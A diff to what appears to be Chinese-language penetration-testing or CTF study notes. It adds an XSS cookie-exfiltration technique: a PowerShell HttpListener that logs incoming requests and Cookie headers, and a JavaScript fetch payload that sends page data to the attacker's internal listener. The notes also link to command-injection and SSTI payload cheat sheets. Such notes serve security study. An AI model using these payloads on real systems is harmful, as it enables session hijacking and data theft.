@@ -152,6 +152,19 @@ fetch(`/getflag\)
     ```
     {% endraw %}
 
+    這個還有其他場景要注意，<span style="background-color: yellow">假設 victim 通不到外網也沒有 python 開 server，那就用 powershell</span>
+    ```ps
+    > $listener = [System.Net.HttpListener]::new();
+    > $listener.Prefixes.Add("http://127.0.0.1:8000/"); # 如果綁 `0.0.0.0`（需提權）→ `$listener.Prefixes.Add("http://+:8000/");` 這樣的話，內網中的其他 Victim 使用 XSS 腳本才會打到目前這一台主機
+    > $listener.Start(); Write-Host "[*] Listening on port 8000..."; while ($true) { $ctx = $listener.GetContext(); $req = $ctx.Request; Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $($req.HttpMethod) $($req.Url)" -ForegroundColor Green; Write-Host "  Cookie: $($req.Headers['Cookie'])" -ForegroundColor Yellow; $resp = $ctx.Response; $resp.StatusCode = 200; $body = [Text.Encoding]::UTF8.GetBytes("ok"); $resp.OutputStream.Write($body, 0, $body.Length); $resp.Close() }
+    ```
+
+
+    然後如果 payload 不能有 URL encode，可以寫 `/` 當作路徑的一部分
+    ```js
+    fetch('http://<內網中我們開 PS 腳本的 IP>:8000/'+document.domain+'/'+Date.now())
+    ```
+
 #### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
 
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
